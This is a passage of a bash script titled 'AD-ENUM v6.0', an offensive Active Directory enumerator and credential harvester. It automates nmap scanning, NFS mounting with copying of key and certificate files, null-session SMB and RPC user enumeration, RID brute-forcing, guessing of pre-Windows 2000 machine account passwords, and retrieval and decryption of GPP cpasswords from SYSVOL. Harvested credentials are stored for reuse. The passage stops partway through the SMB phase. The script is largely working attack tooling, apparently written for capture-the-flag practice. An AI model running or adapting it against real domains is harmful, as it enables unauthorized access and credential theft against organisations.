#!/bin/bash
#══════════════════════════════════════════════════════════════════════════════
#  AD-ENUM v6.0 : Ultimate Active Directory Enumerator & Hash Extractor
#  Optimized for Kali Linux — Advanced Kerberoasting + Fast User Scanning
#  Usage: sudo ./ad-enum.sh -t <TARGET_IP> [-u user] [-p pass] [-H hash]
#══════════════════════════════════════════════════════════════════════════════

RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[0;33m'; BLU='\033[0;34m'
MAG='\033[0;35m'; CYN='\033[0;36m'; WHT='\033[1;37m'; RST='\033[0m'
BOLD='\033[1m'; DIM='\033[2m'

TARGET=""; DOMAIN=""; DOMAIN_DN=""; DC_HOST=""; NETBIOS=""; OUTDIR=""
USERS_FILE=""; VALID_USERS=""; CREDS_FILE=""; HASHES_FILE=""
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
USERLIST="$SCRIPT_DIR/wordlists/ad-usernames.txt"
PASSLIST="$SCRIPT_DIR/wordlists/ad-passwords.txt"
CORE_USERLIST="$SCRIPT_DIR/wordlists/ad-usernames.txt"

banner(){
cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════════╗
    ║   █████╗ ██████╗       ███████╗███╗   ██╗██╗   ██╗███╗   ███╗     ║
    ║  ██╔══██╗██╔══██╗      ██╔════╝████╗  ██║██║   ██║████╗ ████║     ║
    ║  ███████║██║  ██║█████╗█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║     ║
    ║  ██╔══██║██║  ██║╚════╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║     ║
    ║  ██║  ██║██████╔╝      ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║     ║
    ║  ╚═╝  ╚═╝╚═════╝       ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝     ║
    ║     Ultimate AD Enumerator & Hash Extractor v6.0 (Kali Linux)     ║
    ╚═══════════════════════════════════════════════════════════════════╝
EOF
echo ""
}

info()  { echo -e "${BLU}[*]${RST} $1"; }
ok()    { echo -e "${GRN}[+]${RST} $1"; }
warn()  { echo -e "${YEL}[!]${RST} $1"; }
fail()  { echo -e "${RED}[-]${RST} $1"; }
crit()  { echo -e "${RED}${BOLD}[★]${RST} ${RED}$1${RST}"; }
phase() { echo -e "\n${MAG}${BOLD}╔═══════════════════════════════════════════════════════════╗${RST}"; echo -e "${MAG}${BOLD}║  PHASE $1${RST}"; echo -e "${MAG}${BOLD}╚═══════════════════════════════════════════════════════════╝${RST}\n"; }
sep()   { echo -e "${DIM}─────────────────────────────────────────────────────────────${RST}"; }

usage(){
    echo -e "${WHT}Usage:${RST} sudo $0 -t <TARGET_IP> [options]"
    echo -e "  -t  Target DC IP address (required)"
    echo -e "  -u  Username for authenticated enumeration"
    echo -e "  -p  Password for authenticated enumeration"
    echo -e "  -H  NTLM hash for pass-the-hash (LM:NT or just NT)"
    echo -e "  -d  Domain name override (skip auto-detection)"
    echo -e "  -o  Output directory override"
    echo -e "  -s  Skip password spraying phases (faster, stealthier)"
    echo -e "  -w  Custom username wordlist"
    echo -e "  -W  Custom password wordlist"
    echo -e "  -i  Install all missing required and optional tools"
    echo -e "  -h  Show this help"
    exit 0
}

check_root(){ [[ $EUID -ne 0 ]] && { fail "Run as root: sudo $0 -t <IP>"; exit 1; }; }

check_tools(){
    local req=(nmap ldapsearch smbclient rpcclient)
    local imp=(impacket-GetNPUsers impacket-GetUserSPNs impacket-secretsdump impacket-lookupsid impacket-psexec impacket-wmiexec impacket-GetADUsers impacket-reg impacket-rpcdump)
    local opt=(netexec kerbrute gobuster dnsenum ldapdomaindump enum4linux-ng smbmap gpp-decrypt bloodhound-python certipy-ad evil-winrm snmpwalk smtp-user-enum onesixtyone responder rustscan nmblookup nbtscan bloodyAD pywerview pywhisker rusthound-ce impacket-addcomputer impacket-dacledit impacket-owneredit impacket-findDelegation impacket-zerologon impacket-goldenPac impacket-getTGT impacket-samrdump exiftool username-anarchy gMSADumper coercer adidnsdump windapsearch hashcat john)
    local missing=0
    info "Checking tools..."
    for t in "${req[@]}" "${imp[@]}"; do
        command -v "$t" &>/dev/null && ok "$t" || { fail "Missing: $t"; missing=1; }
    done
    for t in "${opt[@]}"; do
        command -v "$t" &>/dev/null && ok "$t (optional)" || warn "$t missing (some features skipped)"
    done
    [[ $missing -eq 1 ]] && { fail "Install missing required tools with: sudo $0 -i"; exit 1; }
}

install_tools(){
    info "Starting tool installation (Kali Linux)..."
    apt update
    
    # APT packages
    local apt_pkgs=(nmap ldap-utils smbclient rpcclient gobuster dnsenum ldapdomaindump enum4linux-ng smbmap gpp-decrypt bloodhound onesixtyone snmp responder rustscan samba-common-bin nbtscan exiftool libimage-exiftool-perl)
    for p in "${apt_pkgs[@]}"; do
        info "Installing $p..."
        apt install -y "$p" &>/dev/null && ok "$p installed" || warn "Failed to install $p via apt"
    done

    # Pip packages
    info "Installing python dependencies..."
    pip3 install impacket bloodhound certipy-ad bloodyAD pywerview pywhisker --break-system-packages &>/dev/null && ok "Python tools installed" || warn "Pip installation failed"

    # username-anarchy (Ruby tool for username permutation)
    if ! command -v username-anarchy &>/dev/null; then
        info "Installing username-anarchy..."
        git clone https://github.com/urbanadventurer/username-anarchy.git /opt/username-anarchy &>/dev/null
        ln -sf /opt/username-anarchy/username-anarchy /usr/local/bin/username-anarchy && ok "username-anarchy installed" || warn "username-anarchy install failed"
    fi

    # rusthound-ce (BloodHound CE Rust collector)
    if ! command -v rusthound-ce &>/dev/null; then
        info "Installing rusthound-ce..."
        cargo install rusthound-ce 2>/dev/null && ok "rusthound-ce installed" || {
            wget -q "https://github.com/NH-RED-TEAM/RustHound-CE/releases/latest/download/rusthound-ce-x86_64-unknown-linux-gnu.tar.gz" -O /tmp/rusthound.tar.gz 2>/dev/null
            tar -xzf /tmp/rusthound.tar.gz -C /usr/local/bin/ 2>/dev/null && ok "rusthound-ce installed" || warn "rusthound-ce install failed"
        }
    fi

    # Kerbrute (Binary)
    if ! command -v kerbrute &>/dev/null; then
        info "Installing kerbrute..."
        wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute &>/dev/null
        chmod +x /usr/local/bin/kerbrute && ok "kerbrute installed" || warn "kerbrute installation failed"
    fi
    
    # NetExec
    if ! command -v netexec &>/dev/null; then
        info "Installing netexec..."
        apt install -y netexec &>/dev/null || pip3 install netexec --break-system-packages &>/dev/null
        command -v netexec &>/dev/null && ok "netexec installed" || warn "netexec installation failed"
    fi

    # Coercer (PetitPotam/MS-EFSRPC/PrinterBug all-in-one)
    if ! command -v coercer &>/dev/null; then
        info "Installing coercer..."
        pip3 install coercer --break-system-packages &>/dev/null && ok "coercer installed" || warn "coercer install failed"
    fi

    # adidnsdump (ADIDNS zone dump)
    if ! command -v adidnsdump &>/dev/null; then
        info "Installing adidnsdump..."
        pip3 install adidnsdump --break-system-packages &>/dev/null && ok "adidnsdump installed" || warn "adidnsdump install failed"
    fi

    # windapsearch (fast Go-based LDAP enum)
    if ! command -v windapsearch &>/dev/null; then
        info "Installing windapsearch..."
        WINAP_URL="https://github.com/ropnop/go-windapsearch/releases/latest/download/windapsearch-linux-amd64"
        wget -q "$WINAP_URL" -O /usr/local/bin/windapsearch 2>/dev/null && \
            chmod +x /usr/local/bin/windapsearch && ok "windapsearch installed" || \
            warn "windapsearch install failed — try: go install github.com/ropnop/go-windapsearch@latest"
    fi

    # tgsrepcrack (Tim Medin's original Kerberoast cracker)
    if [[ ! -f /opt/kerberoast/tgsrepcrack.py ]]; then
        info "Installing tgsrepcrack (kerberoast)..."
        git clone https://github.com/nidem/kerberoast /opt/kerberoast &>/dev/null && \
            ok "tgsrepcrack installed at /opt/kerberoast" || warn "tgsrepcrack install failed"
    fi

    ok "Installation complete! Re-running tool check..."
    check_tools
}

setup(){
    OUTDIR="./ad-enum-results/${TARGET}_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTDIR"/{nmap,smb,ldap,kerberos,hashes,passwords,web,bloodhound,certs,misc}
    USERS_FILE="$OUTDIR/all_users.txt"; VALID_USERS="$OUTDIR/valid_users.txt"
    CREDS_FILE="$OUTDIR/found_credentials.txt"; HASHES_FILE="$OUTDIR/found_hashes.txt"
    touch "$USERS_FILE" "$VALID_USERS" "$CREDS_FILE" "$HASHES_FILE"
    ok "Output → $OUTDIR"
}

add_user(){ [[ -z "$1" ]] && return; echo "$1" | tr '[:upper:]' '[:lower:]' >> "$USERS_FILE"; sort -u -o "$USERS_FILE" "$USERS_FILE"; }
save_cred(){
    [[ -z "$1" || -z "$2" ]] && return
    local e="$1:$2"; grep -qxF "$e" "$CREDS_FILE" 2>/dev/null && return
    echo "$e" >> "$CREDS_FILE"; crit "CREDENTIAL ➜ $e"
    # Update global auth if not set
    if [[ -z "$AUTH_USER" ]]; then
        AUTH_USER="$1"; AUTH_PASS="$2"
        ok "Global Auth updated to: $AUTH_USER"
    fi
}
save_hash(){
    [[ -z "$1" ]] && return; echo "$1" >> "$HASHES_FILE"
}
get_best_cred(){
    # Returns first discovered credential
    DUMP_USER="${AUTH_USER}"; DUMP_PASS="${AUTH_PASS}"; DUMP_HASH="${AUTH_HASH}"
    if [[ -z "$DUMP_USER" && -s "$CREDS_FILE" ]]; then
        # Check for Administrator first
        DUMP_USER=$(grep -i "^administrator:" "$CREDS_FILE" | head -1 | cut -d: -f1)
        DUMP_PASS=$(grep -i "^administrator:" "$CREDS_FILE" | head -1 | cut -d: -f2-)
        
        # fallback to any cred
        if [[ -z "$DUMP_USER" ]]; then
            DUMP_USER=$(head -1 "$CREDS_FILE" | cut -d: -f1)
            DUMP_PASS=$(head -1 "$CREDS_FILE" | cut -d: -f2-)
        fi
    fi
}

parse_nxc_output(){
    local input_file="$1"
    local default_pass="$2"
    grep -iE "\[\+\]|Pwn3d" "$input_file" | grep -iv "STATUS_LOGON_FAILURE" | while read -r line; do
        # Extract user:pass from [+] DOMAIN\user:pass
        if echo "$line" | grep -q ":"; then
            local u=$(echo "$line" | grep -oP '\S+\\\K[^:]+')
            local p=$(echo "$line" | grep -oP ':\K\S+' | sed 's/)$//;s/($//') # strip parens if Pwn3d
        else
            # Case where only [+] line is shown and password was the argument
            local u=$(echo "$line" | grep -oP '\S+\\\K\S+')
            local p="$default_pass"
        fi
        [[ -n "$u" && -n "$p" ]] && save_cred "$u" "$p"
    done
}

# ── Argument Parsing ─────────────────────────────────────────────────────────
AUTH_USER=""; AUTH_PASS=""; AUTH_HASH=""; INSTALL_MODE=0; SKIP_SPRAY=0; DOMAIN_OVERRIDE=""; OUTDIR_OVERRIDE=""
while getopts "t:u:p:H:d:o:w:W:shi" opt; do
    case $opt in t) TARGET="$OPTARG";; u) AUTH_USER="$OPTARG";; p) AUTH_PASS="$OPTARG";;
                 H) AUTH_HASH="$OPTARG";; d) DOMAIN_OVERRIDE="$OPTARG";; o) OUTDIR_OVERRIDE="$OPTARG";;
                 s) SKIP_SPRAY=1;; w) USERLIST="$OPTARG";; W) PASSLIST="$OPTARG";;
                 i) INSTALL_MODE=1;; h) usage;; *) usage;; esac
done

banner; check_root
[[ $INSTALL_MODE -eq 1 ]] && { install_tools; exit 0; }

[[ -z "$TARGET" ]] && { echo -ne "${CYN}[?] Enter target DC IP: ${RST}"; read -r TARGET; }
[[ -z "$TARGET" ]] && { fail "No target."; exit 1; }
[[ -n "$DOMAIN_OVERRIDE" ]] && { DOMAIN="$DOMAIN_OVERRIDE"; ok "Domain override: $DOMAIN"; }
[[ -n "$AUTH_USER" ]] && ok "Auth: $AUTH_USER"
[[ -n "$AUTH_HASH" ]] && ok "Hash auth enabled"
[[ $SKIP_SPRAY -eq 1 ]] && warn "Password spraying DISABLED (-s flag)"
check_tools; setup
echo "AD-ENUM v5.0 | Target: $TARGET | $(date)" > "$OUTDIR/report.txt"

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — NMAP
# ═══════════════════════════════════════════════════════════════════════════════
phase "1 — NMAP SCAN"
info "SYN scan..."
nmap -sS -T4 --top-ports 1000 -oA "$OUTDIR/nmap/quick" "$TARGET" 2>/dev/null | tee "$OUTDIR/nmap/quick_stdout.txt"
OPEN_PORTS=$(grep -oP '\d+/open' "$OUTDIR/nmap/quick.gnmap" 2>/dev/null | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
if [[ -z "$OPEN_PORTS" ]]; then
    warn "Full port scan..."
    nmap -sS -p- -T4 -oA "$OUTDIR/nmap/full" "$TARGET" 2>/dev/null
    OPEN_PORTS=$(grep -oP '\d+/open' "$OUTDIR/nmap/full.gnmap" 2>/dev/null | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
fi
[[ -z "$OPEN_PORTS" ]] && { fail "No open ports."; exit 1; }
ok "Ports: $OPEN_PORTS"

# RustScan (Fast port scanner)
if command -v rustscan &>/dev/null; then
    info "RustScan (fast discovery)..."
    rustscan -a "$TARGET" -u 5000 -- -sCV -oA "$OUTDIR/nmap/rustscan" | tee "$OUTDIR/nmap/rustscan_stdout.txt"
fi

info "Version + scripts..."
nmap -sC -sV -p "$OPEN_PORTS" --script="ldap-rootdse,smb-os-discovery,smb2-security-mode,smb-enum-shares,smb-enum-users" \
    -oA "$OUTDIR/nmap/version" "$TARGET" 2>/dev/null | tee "$OUTDIR/nmap/version_stdout.txt"

# Check SMB signing (for relay attacks)
SMB_SIGNING=$(grep -i "message_signing" "$OUTDIR/nmap/version_stdout.txt" 2>/dev/null | head -1)
if echo "$SMB_SIGNING" | grep -qi "disabled\|not required"; then
    crit "SMB SIGNING NOT REQUIRED — NTLM Relay possible!"
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — DOMAIN DISCOVERY
# ═══════════════════════════════════════════════════════════════════════════════
phase "2 — DOMAIN DISCOVERY"
info "Parsing nmap..."
DOMAIN=$(grep -i "Domain:" "$OUTDIR/nmap/version_stdout.txt" 2>/dev/null | head -1 | sed 's/.*Domain: //;s/,.*//' | tr -d '[:space:]')
DC_HOST=$(grep -i "Computer name:" "$OUTDIR/nmap/version_stdout.txt" 2>/dev/null | head -1 | sed 's/.*Computer name: //;s/,.*//' | tr -d '[:space:]')
NETBIOS=$(grep -i "NetBIOS" "$OUTDIR/nmap/version_stdout.txt" 2>/dev/null | head -1 | grep -oP 'NetBIOS[^:]*:\s*\K\S+')

if [[ -z "$DOMAIN" ]]; then
    info "LDAP rootDSE..."
    LDAP_ROOT=$(ldapsearch -x -H "ldap://$TARGET" -s base namingContexts 2>/dev/null)
    echo "$LDAP_ROOT" > "$OUTDIR/ldap/rootdse.txt"
    DOMAIN_DN=$(echo "$LDAP_ROOT" | grep "namingContexts:" | grep -i "DC=" | head -1 | awk '{print $2}')
    [[ -n "$DOMAIN_DN" ]] && DOMAIN=$(echo "$DOMAIN_DN" | sed 's/DC=//gi;s/,/./g')
fi
[[ -n "$DOMAIN" && -z "$DOMAIN_DN" ]] && DOMAIN_DN=$(echo "$DOMAIN" | sed 's/\./,DC=/g;s/^/DC=/')

if [[ -z "$DOMAIN" ]]; then
    echo -ne "${CYN}[?] Enter domain (e.g. corp.local): ${RST}"; read -r DOMAIN
    [[ -n "$DOMAIN" ]] && DOMAIN_DN=$(echo "$DOMAIN" | sed 's/\./,DC=/g;s/^/DC=/')
fi
[[ -n "$DOMAIN" ]] && ok "Domain: $DOMAIN | DN: $DOMAIN_DN"
[[ -n "$DC_HOST" ]] && ok "DC: $DC_HOST"

# DNS enum (Advanced)
if echo "$OPEN_PORTS" | grep -q "53"; then
    info "DNS SRV records..."
    for srv in _kerberos._tcp _kerberos._udp _ldap._tcp _kpasswd._tcp _gc._tcp; do
        dig +short -t SRV "${srv}.${DOMAIN}" "@$TARGET" 2>/dev/null | tee -a "$OUTDIR/misc/dns_srv.txt"
    done

    command -v dnsenum &>/dev/null && {
        info "dnsenum..."
        dnsenum --dnsserver "$TARGET" "$DOMAIN" --noreverse -o "$OUTDIR/misc/dnsenum.xml" 2>/dev/null | tee "$OUTDIR/misc/dnsenum.txt"
    }
fi

# UDP / NetBIOS Enumeration (Advanced)
if echo "$OPEN_PORTS" | grep -qE "(137|138|445|139)"; then
    info "NetBIOS / UDP discovery..."
    command -v nmblookup &>/dev/null && {
        info "nmblookup -A..."
        nmblookup -A "$TARGET" 2>/dev/null | tee "$OUTDIR/misc/nmblookup.txt"
    }
    command -v nbtscan &>/dev/null && {
        info "nbtscan..."
        nbtscan "$TARGET/30" 2>/dev/null | tee "$OUTDIR/misc/nbtscan.txt"
    }
fi

# ★ NFS Enumeration (HTB: Mirage technique — exposed NFS can leak domain info/files)
if echo "$OPEN_PORTS" | grep -qE "^(2049|111)$|[[:space:]](2049|111)[[:space:]]|[[:space:]](2049|111)$"; then
    sep; info "★ NFS Share Enumeration (port 2049/111 detected)..."
    mkdir -p "$OUTDIR/misc/nfs"
    command -v showmount &>/dev/null && {
        showmount -e "$TARGET" 2>/dev/null | tee "$OUTDIR/misc/nfs/showmount.txt"
        # Mount and enumerate any accessible NFS shares
        NFS_SHARES=$(showmount -e "$TARGET" 2>/dev/null | grep "/" | awk '{print $1}')
        echo "$NFS_SHARES" | while read -r share; do
            [[ -z "$share" || "$share" == "/" ]] && continue
            MOUNT_PT="/tmp/nfs_${RANDOM}"
            mkdir -p "$MOUNT_PT"
            timeout 15 mount -t nfs -o nolock,ro "$TARGET:$share" "$MOUNT_PT" 2>/dev/null && {
                crit "★ NFS SHARE MOUNTED: $share → $MOUNT_PT"
                find "$MOUNT_PT" -type f 2>/dev/null | head -50 | tee "$OUTDIR/misc/nfs/files_$(echo "$share" | tr '/' '_').txt"
                # Search for sensitive files
                find "$MOUNT_PT" -type f \( -name "*.pdf" -o -name "*.txt" -o -name "*.docx" \
                    -o -name "*.conf" -o -name "*.xml" -o -name "*.json" \
                    -o -name "*.key" -o -name "*.pem" -o -name "*.crt" \) 2>/dev/null | while read -r f; do
                    crit "  NFS FILE: $f"
                    cp "$f" "$OUTDIR/misc/nfs/" 2>/dev/null
                done
                # Look for domain info in files
                grep -ri "domain\|password\|user\|credential" "$MOUNT_PT" --include="*.txt" \
                    --include="*.conf" --include="*.xml" 2>/dev/null | head -20 | \
                    tee "$OUTDIR/misc/nfs/sensitive_strings.txt"
                umount "$MOUNT_PT" 2>/dev/null; rmdir "$MOUNT_PT" 2>/dev/null
            } || rmdir "$MOUNT_PT" 2>/dev/null
        done
    } || warn "showmount not installed: apt install nfs-common"
fi

# ★ Pre-Windows 2000 compatible machine accounts (HTB: Vintage technique)
# Machine accounts in Pre-Windows 2000 Compatible Access group use lowercase hostname as password
# e.g., computer$ named "FS01$" has password "fs01"
if echo "$OPEN_PORTS" | grep -q "88" && [[ -n "$DOMAIN" ]]; then
    info "★ Checking Pre-Windows 2000 Compatible Access group members..."
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        ldapsearch -x -H "ldap://$TARGET" -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" \
            -b "$DOMAIN_DN" \
            "(&(objectClass=group)(cn=Pre-Windows 2000 Compatible Access))" member 2>/dev/null | \
            grep "member:" | grep -i '\$' | while read -r mline; do
            MACHINE_DN=$(echo "$mline" | awk '{print $2}')
            MACHINE_SAM=$(echo "$MACHINE_DN" | grep -oP 'CN=\K[^,]+')
            if echo "$MACHINE_SAM" | grep -q '\$'; then
                MACHINE_PASS=$(echo "$MACHINE_SAM" | tr '[:upper:]' '[:lower:]' | tr -d '$')
                crit "★ Pre-Win2000 machine: $MACHINE_SAM — try password: '$MACHINE_PASS'"
                # Verify the password
                netexec smb "$TARGET" -u "$MACHINE_SAM" -p "$MACHINE_PASS" \
                    --no-bruteforce 2>/dev/null | grep -i "\[+\]" && {
                    save_cred "$MACHINE_SAM" "$MACHINE_PASS"
                    crit "★ MACHINE ACCOUNT CREDENTIAL VALID: $MACHINE_SAM / $MACHINE_PASS"
                }
            fi
        done
    else
        # Unauthenticated: try common machine account names with pre-win2k convention
        info "  (need creds to check — use -u/-p when available)"
    fi
fi


# Nmap Kerberos User Enum (No creds needed)
if echo "$OPEN_PORTS" | grep -q "88"; then
    info "Nmap Kerberos user enum (no creds)..."
    nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm="$DOMAIN",userdb="$CORE_USERLIST" --host-timeout 5m "$TARGET" 2>/dev/null | tee "$OUTDIR/kerberos/nmap_kerb_enum.txt"
    grep "Vulnerable" -A 10 "$OUTDIR/kerberos/nmap_kerb_enum.txt" 2>/dev/null | grep -v "Vulnerable" | awk '{print $1}' | while read -r u; do add_user "$u"; done
fi

# /etc/hosts — try netexec --generate-hosts-file first (HTB: Haze technique)
if command -v netexec &>/dev/null; then
    NXC_HOSTS_TMP=$(mktemp)
    netexec smb "$TARGET" --generate-hosts-file "$NXC_HOSTS_TMP" 2>/dev/null
    if [[ -s "$NXC_HOSTS_TMP" ]]; then
        # Extract DC hostname and domain from the generated file
        DC_NXC=$(awk '{print $2}' "$NXC_HOSTS_TMP" | head -1 | sed 's/\..*//')
        [[ -n "$DC_NXC" ]] && DC_HOST="$DC_NXC"
        ok "hosts entry (netexec): $(cat "$NXC_HOSTS_TMP")"
        grep -qF "$TARGET" /etc/hosts 2>/dev/null || cat "$NXC_HOSTS_TMP" >> /etc/hosts
        rm -f "$NXC_HOSTS_TMP"
    else
        rm -f "$NXC_HOSTS_TMP"
        [[ -n "$DC_HOST" && -n "$DOMAIN" ]] && ! grep -q "$TARGET" /etc/hosts 2>/dev/null && {
            echo "$TARGET  $DC_HOST.$DOMAIN $DC_HOST $DOMAIN" >> /etc/hosts; ok "/etc/hosts updated"
        }
    fi
else
    [[ -n "$DC_HOST" && -n "$DOMAIN" ]] && ! grep -q "$TARGET" /etc/hosts 2>/dev/null && {
        echo "$TARGET  $DC_HOST.$DOMAIN $DC_HOST $DOMAIN" >> /etc/hosts; ok "/etc/hosts updated"
    }
fi

# ★ Kerberos Clock Skew Fix (HTB: Absolute technique)
# Large clock skews cause Kerberos auth failures — auto-sync if possible
info "★ Clock skew check for Kerberos..."
SKEW=$(nmap -sV --script=clock-skew -p 88 "$TARGET" 2>/dev/null | grep -oP 'skew:\s*\K[0-9]+' | head -1)
if [[ -n "$SKEW" && "$SKEW" -gt 300 ]]; then
    warn "Clock skew detected: ${SKEW}s — attempting time sync for Kerberos"
    if command -v ntpdate &>/dev/null; then
        ntpdate -u "$TARGET" 2>/dev/null && ok "Clock synced via ntpdate"
    elif command -v rdate &>/dev/null; then
        rdate -n "$TARGET" 2>/dev/null && ok "Clock synced via rdate"
    else
        warn "Install ntpdate or rdate to fix Kerberos clock skew: apt install ntpdate"
        warn "Manual fix: ntpdate -u $TARGET"
    fi
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  NEW PHASE — SNMP & SMTP ENUMERATION
# ═══════════════════════════════════════════════════════════════════════════════
if echo "$OPEN_PORTS" | grep -qE "(161|25)"; then
    phase "SNMP & SMTP DISCOVERY"

    # SNMP
    if echo "$OPEN_PORTS" | grep -q "161"; then
        info "SNMP enumeration..."
        for community in public private manager; do
            onesixtyone -c <(echo "$community") "$TARGET" 2>/dev/null | grep -q "$TARGET" && {
                ok "SNMP Community Found: $community"
                snmpwalk -v2c -c "$community" "$TARGET" 1.3.6.1.4.1.77.1.2.25 2>/dev/null | tee "$OUTDIR/misc/snmp_users.txt"
                grep -oP 'STRING: "\K[^"]+' "$OUTDIR/misc/snmp_users.txt" 2>/dev/null | while read -r u; do add_user "$u"; done
            }
        done
    fi

    # SMTP
    if echo "$OPEN_PORTS" | grep -q "25"; then
        info "SMTP user enumeration..."
        command -v smtp-user-enum &>/dev/null && {
            smtp-user-enum -M VRFY -U "$USERLIST" -t "$TARGET" 2>/dev/null | tee "$OUTDIR/misc/smtp_users.txt"
            grep "exists" "$OUTDIR/misc/smtp_users.txt" 2>/dev/null | awk '{print $2}' | while read -r u; do add_user "$u"; done
        }
    fi
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — SMB + GPP + Share Mining
# ═══════════════════════════════════════════════════════════════════════════════
phase "3 — SMB ENUMERATION"

# ★ netexec ADCS detection (HTB: Fluffy technique — early ADCS fingerprint)
if command -v netexec &>/dev/null && [[ -n "$DUMP_USER" && -n "$DOMAIN" ]]; then
    sep; info "★ Early ADCS detection via netexec (HTB: Fluffy technique)..."
    AUTH_FLAGS="-u $DUMP_USER"
    [[ -n "$DUMP_PASS" ]] && AUTH_FLAGS="$AUTH_FLAGS -p '$DUMP_PASS'" || \
        { [[ -n "$DUMP_HASH" ]] && AUTH_FLAGS="$AUTH_FLAGS -H $DUMP_HASH"; }
    eval "netexec ldap '$TARGET' $AUTH_FLAGS -M adcs 2>/dev/null" | tee "$OUTDIR/certs/adcs_detect.txt"
    grep -i "Found\|PKI\|CA" "$OUTDIR/certs/adcs_detect.txt" 2>/dev/null && \
        crit "★ ADCS (Active Directory Certificate Services) DETECTED!"
fi

if echo "$OPEN_PORTS" | grep -qE "(445|139)"; then

    # netexec SMB
    if command -v netexec &>/dev/null; then
        info "netexec SMB (basic + modules)..."
        netexec smb "$TARGET" 2>/dev/null | tee "$OUTDIR/smb/nxc_info.txt"
        
        # Enumerate shares for common creds
        for cred in "-u '' -p ''" "-u 'guest' -p ''"; do
            eval netexec smb "$TARGET" $cred --shares 2>/dev/null
        done | tee "$OUTDIR/smb/shares.txt"
        
        # Advanced modules
        netexec smb "$TARGET" -u '' -p '' -M enum_domain_users 2>/dev/null | tee "$OUTDIR/smb/nxc_users.txt"
        netexec smb "$TARGET" -u '' -p '' -M users 2>/dev/null | tee -a "$OUTDIR/smb/nxc_users.txt"
        grep -oP '\[\+] \K\S+' "$OUTDIR/smb/nxc_users.txt" 2>/dev/null | while read -r u; do add_user "$u"; done
        sep

        # RID Brute
        info "RID cycling..."
        netexec smb "$TARGET" -u '' -p '' --rid-brute 4000 2>/dev/null | tee "$OUTDIR/smb/rid_brute.txt"
        netexec smb "$TARGET" -u 'guest' -p '' --rid-brute 4000 2>/dev/null | tee -a "$OUTDIR/smb/rid_brute.txt"
        grep -i "SidTypeUser" "$OUTDIR/smb/rid_brute.txt" 2>/dev/null | awk -F'\\ ' '{print $2}' | awk '{print $1}' | grep -v '^\.\|^$' | while read -r u; do add_user "$u"; done
    fi

    # smbclient + smbmap
    smbclient -L "//$TARGET/" -N 2>/dev/null | tee "$OUTDIR/smb/smbclient_list.txt"
    command -v smbmap &>/dev/null && {
        info "smbmap recursive..."
        smbmap -H "$TARGET" -u '' -p '' -R --depth 10 2>/dev/null | tee "$OUTDIR/smb/smbmap_recursive.txt"
    }

    # GetADUsers (Advanced AD user discovery)
    command -v impacket-GetADUsers &>/dev/null && [[ -n "$DOMAIN" ]] && {
        info "impacket-GetADUsers (all users)..."
        impacket-GetADUsers "$DOMAIN/" -all -dc-ip "$TARGET" -no-pass 2>/dev/null | tee "$OUTDIR/smb/getadusers.txt"
        grep -oP '^[^ ]+' "$OUTDIR/smb/getadusers.txt" 2>/dev/null | grep -vE 'User|---|Password|Last|Authenticat' | while read -r u; do add_user "$u"; done
    }

    # ═══ GPP PASSWORDS (HTB: Active) ═══
    info "★ GPP Password hunting..."
    mkdir -p "$OUTDIR/smb/gpp_files"
    for share in Replication SYSVOL NETLOGON; do
        smbclient "//$TARGET/$share" -N -c "recurse ON; prompt OFF; lcd $OUTDIR/smb/gpp_files; mget *.xml" 2>/dev/null
        [[ -n "$AUTH_USER" ]] && smbclient "//$TARGET/$share" -U "$AUTH_USER%$AUTH_PASS" -c "recurse ON; prompt OFF; lcd $OUTDIR/smb/gpp_files; mget *.xml" 2>/dev/null
    done
    # Decrypt GPP
    find "$OUTDIR/smb/gpp_files" -name "*.xml" 2>/dev/null | while read -r f; do
        CPASS=$(grep -oP 'cpassword="\K[^"]+' "$f" 2>/dev/null)
        GUSER=$(grep -oP 'userName="\K[^"]+' "$f" 2>/dev/null)
        if [[ -n "$CPASS" ]] && command -v gpp-decrypt &>/dev/null; then
            GPLAIN=$(gpp-decrypt "$CPASS" 2>/dev/null)
            [[ -n "$GPLAIN" ]] && { crit "★ GPP PASSWORD: $GUSER → $GPLAIN"; save_cred "$(echo "$GUSER" | sed 's/.*\\//')" "$GPLAIN"; }
        fi
    done

    # enum4linux-ng
    command -v enum4linux-ng &>/dev/null && {
        info "enum4linux-ng..."
        enum4linux-ng -A "$TARGET" -oJ "$OUTDIR/smb/enum4linux" 2>/dev/null | tee "$OUTDIR/smb/enum4linux_stdout.txt"
        grep -oP '"username":\s*"\K[^"]+' "$OUTDIR/smb/enum4linux.json" 2>/dev/null | while read -r u; do add_user "$u"; done
    }

    # rpcclient — enumdomusers
    rpcclient -U '' -N "$TARGET" -c 'enumdomusers' 2>/dev/null | tee "$OUTDIR/smb/rpc_users.txt"
    grep -oP '\[([^\]]+)\]' "$OUTDIR/smb/rpc_users.txt" 2>/dev/null | tr -d '[]' | grep -v "0x" | while read -r u; do add_user "$u"; done

    # rpcclient — enumdomgroups + members (Deep Enum)
    info "rpcclient — groups + members..."
    rpcclient -U '' -N "$TARGET" -c 'enumdomgroups' 2>/dev/null | grep -oP 'rid:\[\K0x[0-9a-f]+' | while read -r rid; do
        rpcclient -U '' -N "$TARGET" -c "querygroupmem $rid" 2>/dev/null | grep -oP 'rid:\[\K0x[0-9a-f]+' | while read -r urid; do
            rpcclient -U '' -N "$TARGET" -c "queryuser $urid" 2>/dev/null | grep "User Name" | awk '{print $NF}' | while read -r u; do add_user "$u"; done
        done
    done

    # rpcclient — querydispinfo (alternate user enumeration)
    rpcclient -U '' -N "$TARGET" -c 'querydispinfo' 2>/dev/null | tee "$OUTDIR/smb/rpc_dispinfo.txt"
